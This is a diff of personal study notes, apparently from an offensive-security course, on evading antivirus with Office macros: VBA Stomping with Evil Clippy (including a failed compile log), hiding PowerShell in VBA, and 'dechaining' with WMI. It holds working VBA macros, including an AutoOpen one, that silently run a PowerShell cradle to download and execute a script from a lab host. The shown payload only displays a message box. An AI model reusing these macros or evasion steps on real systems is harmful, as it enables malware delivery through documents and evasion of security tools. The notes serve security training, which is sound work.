@@ -705,8 +705,59 @@ after putting thte basic shellcode (without caesar which was working it is not w
 The P-code is a compiled version of the VBA textual code for 
 the specific version of Microsoft Office and VBA it was created on
 
+As we will demonstrate, only a few antivirus products actually inspect the P-code at all. This 
+concept of removing the VBA source code has been termed VBA Stomping.
 
 
+# notes on macro
+
+the macro needs to be made for the document
+the macro is lobally sterd as a not.dotm file
+
+Evil clippy error
+```
+C:\Users\misthios\codeplay\EvilClippy>csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs
+Microsoft (R) Visual C# Compiler version 4.8.4084.0
+for C# 5
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
+
+compression.cs(111,60): error CS1002: ; expected
+compression.cs(111,78): error CS1519: Invalid token ';' in class, struct, or interface member declaration
+compression.cs(123,25): error CS1002: ; expected
+compression.cs(123,28): error CS1520: Method must have a return type
+compression.cs(123,43): error CS1002: ; expected
+compression.cs(123,50): error CS1519: Invalid token ';' in class, struct, or interface member declaration
+compression.cs(174,49): error CS1002: ; expected
+compression.cs(174,59): error CS1519: Invalid token ')' in class, struct, or interface member declaration
+compression.cs(174,81): error CS1519: Invalid token '-' in class, struct, or interface member declaration
+compression.cs(246,64): error CS1002: ; expected
+compression.cs(246,84): error CS1519: Invalid token ';' in class, struct, or interface member declaration
+compression.cs(320,28): error CS1002: ; expected
+compression.cs(320,43): error CS1519: Invalid token ';' in class, struct, or interface member declaration
+compression.cs(322,32): error CS1002: ; expected
+compression.cs(322,47): error CS1519: Invalid token ';' in class, struct, or interface member declaration
+compression.cs(445,44): error CS1002: ; expected
+compression.cs(445,54): error CS1519: Invalid token ')' in class, struct, or interface member declaration
+compression.cs(445,69): error CS1519: Invalid token ')' in class, struct, or interface member declaration
+compression.cs(516,70): error CS1519: Invalid token '=' in class, struct, or interface member declaration
+compression.cs(516,99): error CS1519: Invalid token '(' in class, struct, or interface member declaration
+compression.cs(658,28): error CS1002: ; expected
+compression.cs(711,25): error CS1002: ; expected
+compression.cs(711,40): error CS1519: Invalid token ';' in class, struct, or interface member declaration
+compression.cs(1084,38): error CS1002: ; expected
+compression.cs(1084,59): error CS1519: Invalid token ';' in class, struct, or interface member declaration
+compression.cs(1086,31): error CS1002: ; expected
+compression.cs(1086,40): error CS1519: Invalid token '=>' in class, struct, or interface member declaration
+compression.cs(1086,50): error CS1519: Invalid token ';' in class, struct, or interface member declaration
+compression.cs(1124,30): error CS1002: ; expected
+compression.cs(1124,43): error CS1519: Invalid token '(' in class, struct, or interface member declaration
+compression.cs(1124,46): error CS1519: Invalid token '=>' in class, struct, or interface member declaration
+compression.cs(1124,57): error CS1519: Invalid token ')' in class, struct, or interface member declaration
+compression.cs(1126,47): error CS1002: ; expected
+compression.cs(1126,57): error CS1519: Invalid token ';' in class, struct, or interface member declaration
+```
 
 ### 6.7.2.1 Exercises
 1. Use FlexHex to delve into the file format of Microsoft Word as explained in this section.
@@ -715,8 +766,9 @@ evasion.
 3. Use the Evil Clippy316 tool (located in C:\Tools\EvilClippy.exe) to automate the VBA Stomping 
 process
 
+https://github.com/outflanknl/EvilClippy.git
 
-
+not able to install.
 
 1. is the shellcode getting detected
 WE TRIED A NEW CODE - might be getting detected need to check with calc opening shellcode.
@@ -728,3 +780,84 @@ TRIED - better performance with antivirus.
 Not happening
 
 4. create a 32 bit program to inject into a 64 bit process.
+
+# Hiding Powershell inside VBA
+
+to reduce detection rate
+
+# Detection of Powershell shellcode
+
+11 detection in code
+
+```vb
+Sub PowershellDownload()
+ Dim strArg As String
+ strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://10.10.6.12/run.txt'))"
+ Shell strArg, vbHide
+End Sub
+```
+
+run.txt contains contains:
+
+```ps1
+$User32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class User32 {
+ [DllImport("user32.dll", CharSet=CharSet.Auto)]
+ public static extern int MessageBox(IntPtr hWnd, String text, String caption, int
+options);
+}
+"@
+Add-Type $User32
+[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
+```
+
+### 6.8.1.1 Exercises
+1. Perform a scan of the PowerShell download cradle and shellcode runner.
+
+create powershell cradle to download a powershell shell code runner 
+
+2. What is the detection rate when the PowerShell instead downloads a pre-compiled C# 
+assembly shellcode runner and loads it dynamically?
+
+use powershell to load a pre compiled C# exe
+
+# Dechaining with WMI
+
+with WMI we will create a Our goal is to use WMI from VBA to create a PowerShell process instead of having it as a child 
+process of Microsoft Word. We will first connect to WMI from VBA which is done through GetObject method specifying the win mgmts. Winmhmt is the WMI service withing the SVCHOST process running under LocalSystem account.
+
+Invoking entire WMI process creation call as a one liner from VBA
+
+```vb
+Sub MyMacro
+ strArg = "powershell"
+ GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+Sub AutoOpen()
+ Mymacro
+End Sub
+```
+VBA macro 
+```vb
+Sub MyMacro
+ strArg = "powershell -exec bypass -nop -c iex((new-object 
+system.net.webclient).downloadstring('http://10.10.6.12/run.txt'))"
+ GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+Sub AutoOpen()
+ Mymacro
+End Sub
+```
+
+### 6.8.2.1 Exercises
+1. Implement the WMI process creation to de-chain the PowerShell process.
+
+![](./wmi_messagebox.png)
+
+2. Update the PowerShell shellcode runner to 64-bit.
+
+
+
+
